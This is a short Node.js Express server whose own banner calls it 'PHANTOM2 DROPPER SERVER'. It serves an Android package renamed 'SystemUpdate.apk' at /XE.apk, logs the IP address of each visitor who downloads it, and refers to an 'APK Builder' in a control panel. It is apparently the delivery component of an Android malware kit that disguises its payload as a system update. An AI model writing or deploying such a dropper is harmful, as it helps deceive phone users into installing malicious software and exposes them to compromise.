const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');

const PORT = 8090;
const BUILD_DIR = path.join(__dirname, 'build');

const app = express();

app.get('/status', (req, res) => {
    res.json({ status: 'ok', port: PORT });
});

app.get('/XE.apk', (req, res) => {
    const apkPath = path.join(BUILD_DIR, 'SystemUpdate.apk');
    if (!fs.existsSync(apkPath)) {
        return res.status(404).send('APK not built yet. Go to APK Builder in the panel.');
    }
    console.log(`[SERVE] SystemUpdate.apk -> ${req.ip}`);
    const stat = fs.statSync(apkPath);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Length', stat.size);
    res.setHeader('Content-Disposition', 'attachment; filename="SystemUpdate.apk"');
    fs.createReadStream(apkPath).pipe(res);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
    console.log(`========================================`);
    console.log(`  PHANTOM2 DROPPER SERVER`);
    console.log(`========================================`);
    console.log(`  URL: http://127.0.0.1:${PORT}/XE.apk`);
    console.log(`========================================`);
});